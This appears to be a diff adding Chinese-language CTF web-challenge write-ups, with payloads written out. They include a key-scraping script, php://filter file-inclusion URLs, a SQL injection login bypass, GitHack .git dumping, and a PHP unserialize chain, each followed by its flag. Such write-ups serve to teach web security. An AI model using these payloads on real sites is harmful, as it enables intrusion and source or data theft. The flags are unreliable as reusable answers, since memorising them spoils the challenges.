@@ -278,10 +278,196 @@ print(''.join([chr(int(line)) for line in lines]))
 
 ```
 ## web20
+动态秘钥可能有时限，所以直接上脚本；看提示说要把密文用get请求提交，所以脚本如下：
+```python
+import requests
+import re
+
+s = requests.session()
+# 可能没跑出来，多跑几次
+for i in range(10):
+    response = s.get("http://123.206.31.85:10020/")
+    key = re.findall("¼(.*?)<br", response.text, re.S)[0]
+    print(key)
+    response = s.get("http://123.206.31.85:10020/?key={}".format(key))
+    print(response.text)
+```
+测试的时候注意上面那个符号可能UTF-8格式有些编辑器显示不出来，编\u9a码为i。可能结果不是每次都有，得到flag如下：
+```
+flag{Md5tiMe8888882019}
+```
+
 ## web3
+文件上传，白名单过滤，只能上传png，先不试这个方向；试试文件包含。
+先用御剑扫描后台得到有四个文件index.php、show.php、upload.php、flag.php
+发现几个链接中都是用参数op传递文件名的：
+```
+http://123.206.31.85:10003/?op=home
+http://123.206.31.85:10003/?op=upload
+```
+所以猜测可以用这个参数打开其他文件，直接打开http://123.206.31.85:10003/?op=show 好像不行，因为show.php是在上传了文件之后才会调用的，还带了一个参数，所以暂时不管。
+
+打开flag也不行，接下来考虑php伪协议进行文件包含
+```
+http://123.206.31.85:10003/?op=php://filter/read=convert.base64-encode/resource=flag
+```
+可以得到一段base64编码：
+```php
+PD9waHAgCiRmbGFnPSJmbGFne2UwMGY4OTMxMDM3Y2JkYjI1ZjZiMWQ4MmRmZTU1NTJmfSI7IAo/Pgo=
+解码得
+<?php 
+$flag="flag{e00f8931037cbdb25f6b1d82dfe5552f}"; 
+?>
+```
+所以flag为
+```
+flag{e00f8931037cbdb25f6b1d82dfe5552f}
+```
+
 ## web4
+直接sql注入username，密码随意。
+在username框中输入
+```
+admin' or 1=1 #
+```
+即可得到flag为：
+```
+flag{7ae7de60f14eb3cbd9403a0c4328598d}
+```
+
 ## web15
+随便填个东西然后burpsuite 抓包，把链接中的1ndex.php改成index.php，然后再发送即可得到flag。
+```
+flag{Is_wh1te_ooo000oo0}
+```
+
 ## web14
+查看源码提示说是假的403，而且题目中提到了备份，考虑一下可能存在git信息泄露，也就是说在该端口下有.git文件，那么我们就可以用GitHack工具把.git仓库中的文件和代码down下来。
+
+在kali linux中下载安装好GitHack，直接GitHub可以下载。
+```shell
+cd GitHack
+python GitHack.py http://123.206.31.85:10014/.git
+```
+成功后会在GitHack目录下生成一个123.206.31.85_10014目录，进入该目录就可以看到有两个down下来的文件，cat flag.php即可查看文件内容，得到flag
+```
+flag{GitIsAFreeVessionControlSyStem}
+```
+
 ## web21
+文件包含、伪协议、代码审计、反序列化
+查看源代码：
+```
+you are not admin !  
+<!--
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+ 
+if(isset($user)&&(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!<br>";
+    include($file); //class.php
+}else{
+    echo "you are not admin ! ";
+}
+ -->
+```
+user参数可以直接用伪协议php://input然后在请求头后带上admin内容即可。
+然后file用文件包含查看index.php和class.php的源代码
+```
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=class.php
+```
+pass参数随便给123，请求链接如下：
+```
+#记得带一个post内容：admin
+http://123.206.31.85:10021/index.php?user=php://input&file=php://filter/read=convert.base64-encode/resource=index.php&pass=123
+
+http://123.206.31.85:10021/index.php?user=php://input&file=php://filter/read=convert.base64-encode/resource=class.php&pass=123
+```
+得到index.php源码的base64加密，解密可得：
+```php
+<?php
+error_reporting(E_ALL & ~E_NOTICE);
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+ 
+if(isset($user)&&(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!<br>";
+    if(preg_match("/f1a9/",$file)){
+        exit();
+    }else{
+        include($file); //class.php
+        $pass = unserialize($pass);
+        echo $pass;
+    }
+}else{
+    echo "you are not admin ! ";
+}
+?>
+ 
+<!--
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+ 
+if(isset($user)&&(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!<br>";
+    include($file); //class.php
+}else{
+    echo "you are not admin ! ";
+}
+ -->
+```
+以及class.php源码的base64加密，解密可得：
+```php
+<?php
+error_reporting(E_ALL & ~E_NOTICE);
+ 
+class Read{//f1a9.php
+    public $file;
+    public function __toString(){
+        if(isset($this->file)){
+            echo file_get_contents($this->file);    
+        }
+        return "__toString was called!";
+    }
+}
+?>
+```
+分析index.php源码可以知道，user依然不变，file直接赋值class.php，然后pass需要用class.php源码进行序列化，序列化之前对源码做一下小修改，令$file=”f1a9.php“，然后进行序列化，代码如下：
+```php
+<?php
+error_reporting(E_ALL & ~E_NOTICE);
+ 
+class Read{//f1a9.php
+    public $file="f1a9.php";
+    public function __toString(){
+        if(isset($this->file)){
+            echo file_get_contents($this->file);    
+        }
+        return "__toString was called!";
+    }
+}
+$a = new Read;
+echo serialize($a);
+?>
+```
+运行得到
+```
+O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
+```
+O:4:"Read"表示4个字符的类Read，{s:4:"file";s:8:"f1a9.php";}表示4个字符的变量file，并且赋值8个字符的值为f1a9.php给变量file。
+所以最终攻击链接为：
+```
+# 记得带上post内容：admin
+http://123.206.31.85:10021/index.php?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
+```
+最终返回查看源码可得flag为：
+```
+flag{db2699f21f433a78}
+```
+
 ## web23
 ## web7
